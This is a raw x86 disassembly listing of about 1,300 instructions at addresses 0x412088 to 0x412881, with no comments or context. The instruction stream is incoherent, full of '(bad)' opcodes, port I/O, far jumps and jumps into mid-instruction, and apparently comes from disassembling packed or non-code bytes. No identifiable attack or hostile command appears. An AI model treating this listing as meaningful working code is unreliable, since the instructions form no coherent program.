  412088:	sub    ecx,DWORD PTR [edi+0x20]
  41208b:	sub    al,0xd
  41208d:	and    ah,BYTE PTR [edi+0x38c57c27]
  412093:	jae    0x41208f
  412095:	adc    eax,DWORD PTR [esi-0x27]
  412098:	xor    eax,0x23bee963
  41209d:	nop
  41209e:	repz sub DWORD PTR [edx-0x41bfccdb],ecx
  4120a5:	add    edx,ebp
  4120a7:	xlat   BYTE PTR ds:[ebx]
  4120a8:	fs cwde 
  4120aa:	add    dh,BYTE PTR [esi-0x6e]
  4120ad:	cmp    eax,0x24
  4120b0:	adc    DWORD PTR [edi+0x12416dc3],ebp
  4120b6:	xchg   esi,eax
  4120b7:	aad    0xf3
  4120b9:	dec    esi
  4120ba:	xchg   ebx,eax
  4120bb:	dec    ebx
  4120bc:	in     eax,dx
  4120bd:	push   edi
  4120be:	push   ebx
  4120bf:	fptan  
  4120c1:	or     BYTE PTR [edi],cl
  4120c3:	or     DWORD PTR [ecx-0x3fc56d7b],0x2c729020
  4120cd:	or     DWORD PTR [esi],edx
  4120cf:	or     DWORD PTR fs:[eax+ebp*8],ebp
  4120d3:	or     ah,BYTE PTR [edx]
  4120d5:	mov    ds:0x6dca691d,eax
  4120da:	pop    ebp
  4120db:	inc    edx
  4120dc:	ror    DWORD PTR [ecx-0x67],1
  4120df:	popa   
  4120e0:	test   DWORD PTR [edi-0x73],edx
  4120e3:	das    
  4120e4:	mov    dl,0xfb
  4120e6:	ja     0x4120bf
  4120e8:	pop    esi
  4120e9:	dec    ebp
  4120ea:	in     al,dx
  4120eb:	inc    edi
  4120ec:	leave  
  4120ed:	in     al,dx
  4120ee:	(bad)  [esi]
  4120f0:	sub    edi,DWORD PTR [edi+ebp*4-0x4f]
  4120f4:	xlat   BYTE PTR ds:[ebx]
  4120f5:	sub    eax,0xed53d780
  4120fa:	std    
  4120fb:	xor    BYTE PTR [esp+edx*4-0x7f499f65],bl
  412102:	sub    cl,dh
  412104:	cwde   
  412105:	jmp    0x41211b
  412107:	mov    ebx,0x98adc501
  41210c:	mov    dl,0xbf
  41210e:	sbb    BYTE PTR [ebp+0x2b0c0f97],0xb2
  412115:	arpl   WORD PTR [eax+0x3272900],si
  41211b:	pop    eax
  41211c:	repnz sbb dl,cl
  41211f:	imul   edx,DWORD PTR [ebx+ebx*1],0xc03b24ae
  412126:	and    BYTE PTR [ebx],bl
  412128:	inc    edx
  412129:	add    eax,0x909ddf1e
  41212e:	pop    ss
  41212f:	push   ss
  412130:	inc    eax
  412131:	arpl   WORD PTR [ecx-0x6ef4a617],si
  412137:	lahf   
  412138:	push   esp
  412139:	outs   dx,DWORD PTR ds:[esi]
  41213a:	push   ecx
  41213b:	mov    al,0x95
  41213d:	sbb    dl,BYTE PTR [eax]
  41213f:	gs test al,0x64
  412142:	and    ebx,DWORD PTR [edx-0x6]
  412145:	jb     0x4120da
  412147:	pop    esp
  412148:	ret    
  412149:	add    eax,0xb93d2fea
  41214e:	sub    bh,bl
  412150:	stos   BYTE PTR es:[edi],al
  412151:	add    eax,DWORD PTR [edi+0x434975e4]
  412157:	test   BYTE PTR [ecx],dh
  412159:	cs or  eax,0xee8bc553
  41215f:	xor    eax,0x99be8e69
  412164:	or     dh,ch
  412166:	dec    eax
  412167:	mov    dl,0xf8
  412169:	and    al,0x15
  41216b:	sbb    BYTE PTR [edx-0x1e28fb4a],cl
  412171:	mov    ch,0x4a
  412173:	xchg   ebx,eax
  412174:	or     eax,0xddf4fbe5
  412179:	or     dl,ah
  41217b:	fild   QWORD PTR [edi-0x797f4b6f]
  412181:	scas   al,BYTE PTR es:[edi]
  412182:	ret    
  412183:	pop    esp
  412184:	clc    
  412185:	add    DWORD PTR [esi+0xc2c8044],edi
  41218b:	(bad)  [edx-0x7f4ba2b8]
  412191:	sbb    eax,0x7756e1a9
  412196:	pop    es
  412197:	scas   eax,DWORD PTR es:[edi]
  412198:	push   es
  412199:	sub    DWORD PTR [ecx+0x68],0x93caa272
  4121a0:	aad    0xa8
  4121a2:	xchg   esp,eax
  4121a3:	xor    dh,0xa8
  4121a6:	xchg   ebp,eax
  4121a7:	repnz rol DWORD PTR [esi-0x7bde5b9a],1
  4121ae:	arpl   WORD PTR [edi+0x56540354],si
  4121b4:	sbb    ebx,esi
  4121b6:	pop    ebp
  4121b7:	xor    eax,0xfd5b5e18
  4121bc:	push   ss
  4121bd:	idiv   DWORD PTR [ecx-0x41acd54a]
  4121c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121c4:	jecxz  0x41215e
  4121c6:	das    
  4121c7:	into   
  4121c8:	add    eax,0xe796c862
  4121cd:	not    DWORD PTR [esi]
  4121cf:	mov    ecx,edx
  4121d1:	lods   al,BYTE PTR ds:[esi]
  4121d2:	mov    BYTE PTR [ebp+0x3e],0x93
  4121d6:	ffree  st(0)
  4121d8:	adc    dl,dl
  4121da:	mov    ah,al
  4121dc:	fnsave ds:0x6340c38e
  4121e2:	icebp  
  4121e3:	test   al,0x6d
  4121e5:	std    
  4121e6:	and    bl,BYTE PTR [edx]
  4121e8:	push   ebp
  4121e9:	dec    ecx
  4121ea:	mov    al,0x91
  4121ec:	ss (bad) 
  4121ee:	sub    ah,bh
  4121f0:	mov    eax,0x386d5007
  4121f5:	xor    al,0xd0
  4121f7:	dec    eax
  4121f8:	sub    dl,BYTE PTR [edx]
  4121fa:	(bad)  
  4121fb:	adc    esp,eax
  4121fd:	ror    ebp,0x3
  412200:	fnstcw WORD PTR [esi-0x54e84943]
  412206:	add    eax,0xcc09c926
  41220b:	(bad)
  41220f:	(bad)  
  412210:	mov    dl,0xca
  412212:	ins    DWORD PTR es:[edi],dx
  412213:	mov    ds:0xa321ace3,al
  412218:	imul   esp,DWORD PTR [ebp+0x57],0x2
  41221c:	test   al,0xb
  41221e:	sbb    al,0x90
  412220:	test   al,0x6d
  412222:	mov    fs:0x8a4e6e31,eax
  412228:	dec    esp
  412229:	jp     0x4121d9
  41222b:	and    eax,0xec2ff5
  412230:	fnstcw WORD PTR [eax-0x65]
  412233:	dec    esp
  412234:	syscall 
  412236:	mov    WORD PTR [esi],gs
  412238:	test   esi,edx
  41223a:	aam    0x54
  41223c:	inc    eax
  41223d:	sub    ch,bh
  41223f:	bound  esp,QWORD PTR [edi+edx*8-0x2c81c162]
  412246:	stos   DWORD PTR es:[edi],eax
  412247:	or     ebx,esp
  412249:	in     al,dx
  41224a:	popf   
  41224b:	push   ss
  41224c:	mov    ch,0x1f
  41224e:	dec    esi
  41224f:	dec    ebx
  412250:	stos   DWORD PTR es:[edi],eax
  412251:	jmp    0x8dd771ec
  412256:	pop    es
  412257:	lock sub bh,BYTE PTR [esp+eiz*8+0x191bee81]
  41225f:	cmc    
  412260:	js     0x412283
  412262:	inc    ebx
  412263:	lods   eax,DWORD PTR ds:[esi]
  412264:	stos   DWORD PTR es:[edi],eax
  412265:	cdq    
  412266:	aam    0xa8
  412268:	add    eax,0xdf678394
  41226d:	int3   
  41226e:	cld    
  41226f:	shl    BYTE PTR [ebp+edi*8-0x46],1
  412273:	sbb    eax,0x86dea7c5
  412278:	mov    al,ds:0xf906c11c
  41227d:	icebp  
  41227e:	out    dx,eax
  41227f:	mov    ds:0x7089e0dd,al
  412284:	lea    ebp,[eax]
  412286:	retf   0x152b
  412289:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41228a:	mov    eax,ds:0x6487a92d
  41228f:	add    BYTE PTR [eax],0x61
  412292:	jns    0x41227e
  412294:	sub    eax,0xede0217e
  412299:	pop    edi
  41229a:	ins    BYTE PTR es:[edi],dx
  41229b:	mov    al,BYTE PTR [ebx+0x7d]
  41229e:	sahf   
  41229f:	sbb    BYTE PTR [edi+eax*4],dh
  4122a2:	jb     0x412310
  4122a4:	aas    
  4122a5:	jmp    DWORD PTR [edx+0x72]
  4122a8:	(bad)  [ebx]
  4122aa:	sbb    al,0x6e
  4122ac:	mov    dh,BYTE PTR [ebx]
  4122ae:	or     dh,BYTE PTR [esi+0x62]
  4122b1:	outs   dx,BYTE PTR ds:[esi]
  4122b2:	add    ah,BYTE PTR [ebx+0x7772e2e6]
  4122b8:	sub    DWORD PTR [ecx-0x642cb825],0xe93e7624
  4122c2:	adc    BYTE PTR [ebx+0x20],bh
  4122c5:	rol    al,1
  4122c7:	push   ss
  4122c8:	cmp    al,0xab
  4122ca:	retf   0x2481
  4122cd:	pop    esi
  4122ce:	test   esp,edi
  4122d0:	add    eax,0xed9dae2b
  4122d5:	ds ins DWORD PTR es:[edi],dx
  4122d7:	mov    esi,0xf0dd0433
  4122dc:	or     DWORD PTR [ecx-0x64],0xfffffffa
  4122e0:	repnz xchg ebx,eax
  4122e2:	mov    ebx,0x691acb4c
  4122e7:	or     DWORD PTR [ebp-0x4c2f8205],0xa
  4122ee:	(bad)  [edi+0xa]
  4122f1:	xor    eax,0x2013f54d
  4122f6:	mov    ds,edx
  4122f8:	mov    edi,0x941c1e44
  4122fd:	stc    
  4122fe:	push   0x3
  412300:	dec    ebx
  412301:	(bad)
  412304:	in     eax,dx
  412305:	xchg   ecx,eax
  412306:	imul   edi,DWORD PTR [eax],0x7f
  412309:	ss jns 0x41232a
  41230c:	ficom  DWORD PTR [eax+0x23]
  41230f:	addr16 in eax,dx
  412311:	js     0x412371
  412313:	sbb    eax,0x4b6be789
  412318:	jg     0x41237d
  41231a:	add    al,0xf4
  41231c:	cmc    
  41231d:	jmp    0x412353
  41231f:	sbb    esp,DWORD PTR [esi+0x235baa79]
  412325:	mov    dl,0x68
  412327:	inc    edi
  412328:	mov    esp,0xd93681ae
  41232d:	inc    edx
  41232e:	push   ds
  41232f:	ret    0xf29a
  412332:	sbb    cl,BYTE PTR [eax+ebp*2-0x5ebd0ff7]
  412339:	ss out dx,eax
  41233b:	jo     0x41233a
  41233d:	test   esp,eax
  41233f:	fs ret 
  412341:	icebp  
  412342:	mov    bl,0xb
  412344:	je     0x412395
  412346:	(bad)  [eax]
  412348:	(bad)  
  412349:	fsub   QWORD PTR [edi+0x28e0979a]
  41234f:	ins    DWORD PTR es:[edi],dx
  412350:	sub    DWORD PTR [edx+0x1850f3ab],ecx
  412356:	cmp    esi,DWORD PTR [ebx]
  412358:	xchg   esi,eax
  412359:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41235a:	cld    
  41235b:	fiadd  DWORD PTR [ebx]
  41235d:	in     al,dx
  41235e:	mov    dl,0x6b
  412360:	push   ds
  412361:	int    0xbc
  412363:	mov    ebp,0x2503f1f1
  412368:	mov    WORD PTR [ebx+0x4e4f6608],fs
  41236e:	pop    ss
  41236f:	and    DWORD PTR [edx],0x35ce945b
  412375:	js     0x4123eb
  412377:	repz fmul st(5),st
  41237a:	cmp    al,0x5c
  41237c:	jp     0x41231e
  41237e:	fwait
  41237f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412380:	retf   
  412381:	mov    esi,0xa2fe5dec
  412386:	mov    esp,DWORD PTR [ebx-0x7f]
  412389:	cmp    bl,BYTE PTR [edx]
  41238b:	inc    edx
  41238c:	ret    0xe651
  41238f:	mov    eax,0x1a7151a9
  412394:	test   DWORD PTR [ebx+0x2c29e944],ebp
  41239a:	dec    edi
  41239b:	adc    edi,DWORD PTR [edx]
  41239d:	sub    ecx,edi
  41239f:	xor    edx,DWORD PTR [ebx+0x57]
  4123a2:	cli    
  4123a3:	pop    eax
  4123a4:	cmp    BYTE PTR [ebx-0xa],cl
  4123a7:	mov    cl,0x64
  4123a9:	push   0xbd9d994e
  4123ae:	cmp    ch,bh
  4123b0:	call   0x8be8:0x67367791
  4123b7:	inc    edx
  4123b8:	cs out 0x9e,al
  4123bb:	(bad)  
  4123bc:	cld    
  4123bd:	inc    esi
  4123be:	test   eax,0xab4c7c67
  4123c3:	xchg   esp,eax
  4123c4:	dec    edi
  4123c5:	and    al,0xe8
  4123c7:	push   edi
  4123c8:	jnp    0x412389
  4123ca:	clc    
  4123cb:	sbb    BYTE PTR [esi],dh
  4123cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123ce:	bound  ecx,QWORD PTR [ecx]
  4123d0:	cdq    
  4123d1:	js     0x41243e
  4123d3:	rol    DWORD PTR [edi],0x5e
  4123d6:	xchg   DWORD PTR [ebx-0x67f896dc],edx
  4123dc:	jmp    0x8c7e:0x2642f647
  4123e3:	hlt    
  4123e4:	into   
  4123e5:	mov    edx,0x5991d0b5
  4123ea:	lea    esi,[ebx-0x1c]
  4123ed:	scas   al,BYTE PTR es:[edi]
  4123ee:	rol    DWORD PTR [esi],0xc
  4123f1:	pop    ss
  4123f2:	ins    DWORD PTR es:[edi],dx
  4123f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123f4:	enter  0x86ae,0xcc
  4123f8:	jl     0x412384
  4123fa:	dec    esp
  4123fb:	or     BYTE PTR [eax+0x3f],dh
  4123fe:	loop   0x4123c2
  412400:	call   0x9085:0x6dfea51
  412407:	rcl    BYTE PTR cs:[edi+0xf],0xec
  41240c:	gs push 0x657d9138
  412412:	shl    DWORD PTR [eax-0x28e4493e],cl
  412418:	stc    
  412419:	jl     0x412484
  41241b:	adc    eax,0xdb8500b2
  412420:	ror    edx,1
  412422:	out    0x51,al
  412424:	dec    esi
  412425:	test   BYTE PTR [ebp+0x2b788916],al
  41242b:	fs fwait
  41242d:	cmp    DWORD PTR [edi],0xbd32e4e7
  412433:	mov    dl,0xb0
  412435:	popf   
  412436:	stc    
  412437:	imul   eax,DWORD PTR es:[esi+0x642bee60],0x8fc12137
  412442:	(bad)  
  412443:	mov    edi,0xdf7a879b
  412448:	mov    eax,ds:0x2f6f38e0
  41244d:	dec    ecx
  41244e:	jbe    0x4123f5
  412450:	fsubr  DWORD PTR [edx]
  412452:	xchg   ebp,eax
  412453:	pushf  
  412454:	or     ebx,esp
  412456:	ror    BYTE PTR [ebp-0x2ef3c516],0xad
  41245d:	mov    dh,0x9b
  41245f:	outs   dx,DWORD PTR ds:[esi]
  412460:	xor    al,BYTE PTR [eax+0x101911e8]
  412466:	mov    edi,0x66be3502
  41246b:	hlt    
  41246c:	icebp  
  41246d:	rcl    cl,cl
  41246f:	shl    DWORD PTR [eax],0xbc
  412472:	and    DWORD PTR [eax+0x5c17f928],0xffffffb7
  412479:	xor    eax,0xb9b1e18d
  41247e:	nop
  41247f:	dec    eax
  412480:	add    BYTE PTR [ebp+0x73],dl
  412483:	pusha  
  412484:	adc    BYTE PTR [eax],dl
  412486:	fimul  DWORD PTR [edx-0x69]
  412489:	out    dx,al
  41248a:	(bad)  
  41248b:	sub    ebx,DWORD PTR [edi]
  41248d:	lods   al,BYTE PTR ds:[esi]
  41248e:	mov    DWORD PTR [ebx],ebx
  412490:	ja     0x4124e1
  412492:	or     BYTE PTR [ecx],ah
  412494:	sbb    al,0xdf
  412496:	inc    ebx
  412497:	dec    ebp
  412498:	xchg   ebx,eax
  412499:	cmc    
  41249a:	mov    esi,0xe781ff1a
  41249f:	cmp    ebx,DWORD PTR [eiz*2+0x4a19cb31]
  4124a6:	pusha  
  4124a7:	shl    BYTE PTR [edi-0x77],0xa1
  4124ab:	outs   dx,DWORD PTR ds:[esi]
  4124ac:	mov    DWORD PTR [ebp+0x4de233b5],0x206133a9
  4124b6:	test   BYTE PTR [eax-0x4],dh
  4124b9:	fcomp  QWORD PTR [edi+eax*4+0x31754ae0]
  4124c0:	fsub   QWORD PTR [ebx]
  4124c2:	jp     0x412534
  4124c4:	dec    esp
  4124c5:	lahf   
  4124c6:	mov    dh,0x9f
  4124c8:	sbb    al,0xd9
  4124ca:	std    
  4124cb:	inc    esp
  4124cc:	mov    al,0x8c
  4124ce:	int3   
  4124cf:	add    DWORD PTR [esi+0x64],eax
  4124d2:	jge    0x412480
  4124d4:	in     al,0x3f
  4124d6:	pop    edi
  4124d7:	out    0xc3,eax
  4124d9:	jmp    0x412497
  4124db:	and    eax,0x2e027f4b
  4124e0:	sahf   
  4124e1:	push   ebp
  4124e2:	mov    WORD PTR ds:0x50107f1c,cs
  4124e8:	adc    DWORD PTR [ebx],ebx
  4124ea:	xchg   ebx,eax
  4124eb:	iret   
  4124ec:	std    
  4124ed:	(bad)  
  4124ee:	jne    0x4124a1
  4124f0:	sub    DWORD PTR [edx+0x659e5558],ebx
  4124f6:	cmc    
  4124f7:	mov    edi,0xd3c6f0ed
  4124fc:	call   0x74ff:0x638eb3bf
  412503:	outs   dx,DWORD PTR ds:[esi]
  412504:	iret   
  412505:	inc    ebx
  412506:	pop    es
  412507:	dec    esi
  412508:	or     al,0x3c
  41250a:	ret    
  41250b:	inc    eax
  41250c:	sbb    eax,0xa0291f68
  412511:	xchg   esp,eax
  412512:	hlt    
  412513:	cs xchg esp,eax
  412515:	or     ebp,DWORD PTR [ecx]
  412517:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412518:	lahf   
  412519:	xchg   ebp,eax
  41251a:	xor    ah,BYTE PTR [ebx+0x121c582a]
  412520:	or     al,0xc2
  412522:	mov    ecx,0x903f1f7f
  412527:	arpl   WORD PTR [eax+0x41],di
  41252a:	test   edi,0x380cd4fb
  412530:	sbb    esi,DWORD PTR [ebx-0x132e5d19]
  412536:	pop    es
  412537:	push   cs
  412538:	hlt    
  412539:	(bad)  
  41253a:	shr    BYTE PTR [ecx-0x50b79460],cl
  412540:	repz sub ch,ah
  412543:	into   
  412544:	(bad)  
  412545:	iret   
  412546:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412547:	(bad)  
  412548:	xlat   BYTE PTR ds:[ebx]
  412549:	ds dec eax
  41254b:	scas   eax,DWORD PTR es:[edi]
  41254c:	jecxz  0x412549
  41254e:	pop    esp
  41254f:	pop    ebp
  412550:	sbb    BYTE PTR [edi+edi*1-0x21],bl
  412554:	dec    edi
  412555:	adc    al,0x73
  412557:	retf   0x5fcd
  41255a:	dec    ebp
  41255b:	sub    DWORD PTR [ebp+0x1797cbb9],ecx
  412561:	jp     0x412516
  412563:	mov    bh,BYTE PTR [eax+ebx*8+0x1da789a9]
  41256a:	adc    bh,BYTE PTR [ecx]
  41256c:	add    BYTE PTR [ebx],dh
  41256e:	jle    0x4124fa
  412570:	sub    cl,BYTE PTR [esi+esi*2-0x10]
  412574:	push   DWORD PTR [edi+0x158fb262]
  41257a:	lock jae 0x4125a2
  41257d:	inc    ebx
  41257e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41257f:	(bad)  
  412580:	jmp    0x5c39a2d7
  412585:	jp     0x412512
  412587:	sbb    eax,0x6e7eff24
  41258c:	sbb    ecx,DWORD PTR ds:0x49b95fac
  412592:	mov    dh,BYTE PTR [edi+edx*4]
  412595:	push   eax
  412596:	stos   BYTE PTR es:[edi],al
  412597:	adc    cl,cl
  412599:	pop    edi
  41259a:	dec    ecx
  41259b:	xor    eax,0x2f652cd2
  4125a0:	iret   
  4125a1:	clc    
  4125a2:	sbb    edx,esi
  4125a4:	pop    ds
  4125a5:	sbb    eax,DWORD PTR [ecx-0x79043264]
  4125ab:	(bad)
  4125ae:	pushf  
  4125af:	ins    BYTE PTR es:[edi],dx
  4125b0:	push   0xff094f5e
  4125b5:	nop
  4125b6:	or     ecx,edi
  4125b8:	pop    eax
  4125b9:	and    ch,BYTE PTR [edi+ebx*8+0x440b5e67]
  4125c0:	mov    dl,0x9a
  4125c2:	ss icebp 
  4125c4:	iret   
  4125c5:	xor    DWORD PTR [edx-0xc],esp
  4125c8:	scas   eax,DWORD PTR es:[edi]
  4125c9:	imul   esp,DWORD PTR [eax+0x20],0x49
  4125cd:	inc    ebx
  4125ce:	jl     0x412579
  4125d0:	test   eax,0xd45cf2db
  4125d5:	and    edx,DWORD PTR [ecx-0x3d]
  4125d8:	push   ss
  4125d9:	popf   
  4125da:	jb     0x41259c
  4125dc:	pop    edi
  4125dd:	int3   
  4125de:	xchg   ebp,eax
  4125df:	xchg   esi,eax
  4125e0:	add    edx,DWORD PTR [ecx]
  4125e2:	call   0xcb81c45c
  4125e7:	(bad)  [ebx+0x1441c409]
  4125ed:	cs cmp eax,0x8f6b5150
  4125f3:	out    dx,eax
  4125f4:	sti    
  4125f5:	cld    
  4125f6:	sub    DWORD PTR [edi-0x6761a580],eax
  4125fc:	sbb    DWORD PTR [edx+0x35],esp
  4125ff:	pusha  
  412600:	fst    st(6)
  412602:	jo     0x4125a9
  412604:	push   es
  412605:	in     al,0x5c
  412607:	dec    esi
  412608:	pop    ds
  412609:	stos   DWORD PTR es:[edi],eax
  41260a:	jecxz  0x412622
  41260c:	xlat   BYTE PTR ds:[ebx]
  41260d:	add    al,0xb
  41260f:	xchg   DWORD PTR [esi+0x5c0a4121],edi
  412615:	(bad)  [edx+0x22]
  412618:	adc    al,0xba
  41261a:	xchg   BYTE PTR [edx],bh
  41261c:	rcr    DWORD PTR [edi+ecx*1+0x43],1
  412620:	mov    BYTE PTR [esi+ebp*1-0x5f1f19c6],ch
  412627:	outs   dx,BYTE PTR ds:[esi]
  412628:	int3   
  412629:	rcr    DWORD PTR [ebp-0x10],cl
  41262c:	in     eax,dx
  41262d:	leave  
  41262e:	call   0x7c5e2697
  412633:	repz into 
  412635:	adc    DWORD PTR [ebp-0x55],0x75ba11d7
  41263c:	fistp  DWORD PTR [eax+0x3]
  41263f:	inc    esp
  412640:	clc    
  412641:	sub    DWORD PTR ds:0x60ce64be,edx
  412647:	xchg   BYTE PTR [ebp-0x62edf6cc],cl
  41264d:	popa   
  41264e:	mov    ch,0x5f
  412650:	adc    dl,al
  412652:	mov    DWORD PTR fs:[ebp+0x1b],edx
  412656:	test   BYTE PTR [ebx+edx*8+0xf],dh
  41265a:	push   ebx
  41265b:	xchg   ebx,eax
  41265c:	pop    ds
  41265d:	jno    0x4126b4
  41265f:	inc    edx
  412660:	jns    0x41261b
  412662:	xchg   ebx,eax
  412663:	ror    ecx,cl
  412665:	dec    edi
  412666:	fistp  WORD PTR [ebp+0x273232ba]
  41266c:	pop    ds
  41266d:	xchg   ecx,eax
  41266e:	jbe    0x412652
  412670:	add    BYTE PTR [eax-0x10],dh
  412673:	int    0x79
  412675:	add    esi,edx
  412677:	cmp    eax,0x3577932e
  41267c:	sub    eax,0x87cd73f5
  412681:	inc    ebp
  412682:	xchg   esi,eax
  412683:	outs   dx,DWORD PTR ds:[esi]
  412684:	or     ah,bl
  412686:	jp     0x41264d
  412688:	stos   DWORD PTR es:[edi],eax
  412689:	or     edi,esi
  41268b:	scas   al,BYTE PTR es:[edi]
  41268c:	jle    0x41264a
  41268e:	icebp  
  41268f:	fwait
  412690:	xchg   esp,eax
  412691:	imul   ebx,DWORD PTR [ebp-0x116d9cd0],0x9fd11fb
  41269b:	gs loopne 0x4126f6
  41269e:	rcr    ecx,1
  4126a0:	out    dx,al
  4126a1:	push   ebx
  4126a2:	rcr    DWORD PTR [ebp-0xf1d712b],0x28
  4126a9:	add    DWORD PTR [edi],0x58e0ad42
  4126af:	fld    DWORD PTR [edi+ebx*2]
  4126b2:	in     al,0x34
  4126b4:	jg     0x4126d7
  4126b6:	xchg   edi,eax
  4126b7:	ds mov edi,0x11dbfdf5
  4126bd:	jbe    0x412709
  4126bf:	test   eax,0x751f48ab
  4126c4:	pop    ss
  4126c5:	xlat   BYTE PTR ds:[ebx]
  4126c6:	adc    ebx,ecx
  4126c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126c9:	pushf  
  4126ca:	(bad)  
  4126cb:	fadd   DWORD PTR [ebp-0x63718719]
  4126d1:	mov    dh,0xa5
  4126d3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126d5:	cdq    
  4126d6:	jp     0x41272d
  4126d8:	mov    eax,ds:0x1c07ff1
  4126dd:	and    BYTE PTR [edx+ecx*8-0x6f],al
  4126e1:	or     al,BYTE PTR [esi+ebp*2+0x6b]
  4126e5:	in     eax,dx
  4126e6:	leave  
  4126e7:	xchg   BYTE PTR [ebp-0xcb464b1],ah
  4126ed:	test   eax,0x1f2ad505
  4126f2:	mov    ds:0xe969d74e,eax
  4126f7:	loop   0x4126b5
  4126f9:	std    
  4126fa:	push   es
  4126fb:	sahf   
  4126fc:	jl     0x41274d
  4126fe:	push   0x6c
  412700:	xor    al,0x25
  412702:	test   BYTE PTR [esi-0x3ac51ec3],bl
  412708:	lods   al,BYTE PTR ds:[esi]
  412709:	jo     0x41269e
  41270b:	aaa    
  41270c:	test   BYTE PTR [edx],dh
  41270e:	jb     0x4126fe
  412710:	xor    eax,0xcea9c124
  412715:	iret   
  412716:	arpl   WORD PTR cs:[edx],sp
  412719:	shl    BYTE PTR [edi-0x5e],1
  41271c:	ja     0x412760
  41271e:	test   DWORD PTR [eax-0x7b],ebx
  412721:	sbb    al,0x91
  412723:	(bad)  
  412724:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412725:	test   al,0x4b
  412727:	fisub  WORD PTR [ebp+ebp*1-0x18]
  41272b:	(bad)  
  41272c:	xchg   ecx,eax
  41272d:	dec    esp
  41272e:	pop    esi
  41272f:	test   al,0x85
  412731:	sub    edx,esp
  412733:	mov    bh,0xfe
  412735:	test   DWORD PTR [ebx+0x46fae09a],ecx
  41273b:	sub    al,BYTE PTR [ecx+eiz*8+0x1cf93f63]
  412742:	jmp    0x76212625
  412747:	push   edi
  412748:	add    eax,ecx
  41274a:	jnp    0x412794
  41274c:	ins    BYTE PTR es:[edi],dx
  41274d:	sbb    esi,DWORD PTR [edx+eiz*1]
  412750:	daa    
  412751:	inc    edx
  412752:	stos   DWORD PTR es:[edi],eax
  412753:	and    ebx,DWORD PTR [edi-0x20f35c9d]
  412759:	sub    BYTE PTR [ebx-0x80],0x53
  41275d:	xor    ch,cl
  41275f:	mov    ebp,ecx
  412761:	mov    ebp,DWORD PTR [ebx+esi*1-0x79e85b5c]
  412768:	mov    edi,0x166cffb8
  41276d:	xor    dl,bl
  41276f:	or     esp,DWORD PTR [edi-0x6dfa85bc]
  412775:	cld    
  412776:	mov    bh,0xd5
  412778:	sar    DWORD PTR [ebx-0x755c4a28],cl
  41277e:	cs mov edi,0x62dd2697
  412784:	mov    bl,0x45
  412786:	pop    edi
  412787:	or     eax,0x50be8a3d
  41278c:	inc    esi
  41278d:	imul   ebx,ecx,0x2dddaa4d
  412793:	inc    BYTE PTR [edi+0x54a38438]
  412799:	add    eax,0xf13f849c
  41279e:	div    dl
  4127a0:	xchg   edx,eax
  4127a1:	xor    ah,ah
  4127a3:	inc    ecx
  4127a4:	xor    eax,DWORD PTR [esi-0x6be3a780]
  4127aa:	out    dx,eax
  4127ab:	cmp    dl,BYTE PTR ds:0x1045cca1
  4127b1:	sub    eax,0x4188fcff
  4127b6:	scas   eax,DWORD PTR es:[edi]
  4127b7:	repz aad 0xa1
  4127ba:	sbb    edi,DWORD PTR [ebx]
  4127bc:	push   0xffffff8a
  4127be:	sbb    bl,bl
  4127c0:	jp     0x4127fe
  4127c2:	cwde   
  4127c3:	push   esp
  4127c4:	in     al,0x71
  4127c6:	xor    eax,0x71b31c72
  4127cb:	pusha  
  4127cc:	mov    ds:0x86c75a7,eax
  4127d1:	stc    
  4127d2:	dec    esp
  4127d3:	add    eax,ebp
  4127d5:	mov    ebp,DWORD PTR [edx]
  4127d7:	pop    esp
  4127d8:	shl    BYTE PTR gs:[edi-0x45873064],cl
  4127df:	lahf   
  4127e0:	or     ch,BYTE PTR [ecx]
  4127e2:	sbb    DWORD PTR fs:[ecx],eax
  4127e5:	adc    al,0x9d
  4127e7:	repz mul bh
  4127ea:	mov    fs,WORD PTR [edx-0x3b]
  4127ed:	jae    0x4127a5
  4127ef:	push   edx
  4127f0:	into   
  4127f1:	push   esp
  4127f2:	inc    esi
  4127f3:	ins    DWORD PTR es:[edi],dx
  4127f4:	stos   BYTE PTR es:[edi],al
  4127f5:	pop    edi
  4127f6:	add    al,0x2a
  4127f8:	mov    edi,0x2d7d418
  4127fd:	mov    DWORD PTR [esi],esp
  4127ff:	cdq    
  412800:	mov    ebp,0x689683ec
  412805:	mov    ds:0x6394b053,eax
  41280a:	pop    ds
  41280b:	mul    DWORD PTR [ebx+ecx*8-0x6d]
  41280f:	pop    eax
  412810:	adc    BYTE PTR [ebx+0x73b92272],bl
  412816:	arpl   WORD PTR [edi+0x5e936e12],bp
  41281c:	ins    BYTE PTR es:[edi],dx
  41281d:	mov    ecx,0xfea87d2
  412822:	dec    edi
  412823:	push   es
  412824:	lods   eax,DWORD PTR ds:[esi]
  412825:	ret    0xc098
  412828:	adc    ah,BYTE PTR [ebp+0x5ec7c8b0]
  41282e:	mov    ecx,0x9054b266
  412833:	mov    ds:0xa0b1641,al
  412838:	mov    esi,0x4cc9d593
  41283d:	sbb    BYTE PTR [esp+ebx*8-0xa],bl
  412841:	xor    ecx,DWORD PTR [esi+0x5fe02aba]
  412847:	inc    ebp
  412848:	das    
  412849:	jl     0x4127f0
  41284b:	shr    BYTE PTR [ecx-0x3ca72d9a],cl
  412851:	jb     0x4128af
  412853:	int3   
  412854:	in     al,0x9b
  412856:	mov    dl,0xa6
  412858:	push   0xecaede1a
  41285d:	mov    ah,0x46
  41285f:	js     0x41286c
  412861:	sub    edx,edi
  412863:	cmp    BYTE PTR [ebp+0x56],bl
  412866:	jle    0x4127e8
  412868:	add    eax,0xfec47cc3
  41286d:	(bad)  
  41286f:	test   ch,bl
  412871:	mov    dl,0xe0
  412873:	lea    ebp,[edi+0x6f]
  412876:	lds    ebp,FWORD PTR [ecx+ebp*2+0x6d]
  41287a:	in     al,0x9d
  41287c:	add    bl,BYTE PTR [edi]
  41287e:	xor    al,0x99
  412880:	in     al,dx
  412881:	aad    0xdf
